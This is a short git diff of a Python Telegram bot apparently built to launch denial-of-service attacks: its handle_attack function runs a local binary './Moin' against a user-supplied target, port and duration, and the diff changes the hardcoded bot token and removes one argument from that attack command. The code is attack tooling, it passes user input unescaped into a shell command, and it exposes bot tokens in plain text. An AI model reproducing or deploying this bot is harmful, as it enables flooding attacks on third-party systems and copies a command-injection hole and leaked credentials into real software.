@@ -7,7 +7,7 @@ import threading
 from telebot import types
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8048715452:AAExLiyCZC3-3sOdMOBeLK9lhsi1JbF8kTo')
+bot = telebot.TeleBot('7555897511:AAFWxYqkBOu2HGBEtrejJqtzZWL1FMDWgxQ')
 
 # Group and channel details
 GROUP_ID = "-1002369239894"
@@ -112,7 +112,7 @@ def handle_attack(message):
     bot.send_message(message.chat.id, f"🚀 **Attack Shuru!**\n🎯 `{target}:{port}`\n⏳ {time_duration}s👇BETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
 
     try:
-        subprocess.run(f"./Moin {target} {port} {time_duration} 900", shell=True, check=True)
+        subprocess.run(f"./Moin {target} {port} {time_duration}", shell=True, check=True)
     except subprocess.CalledProcessError:
         bot.reply_to(message, "❌ **Attack fail ho gaya!**")
         is_attack_running = False
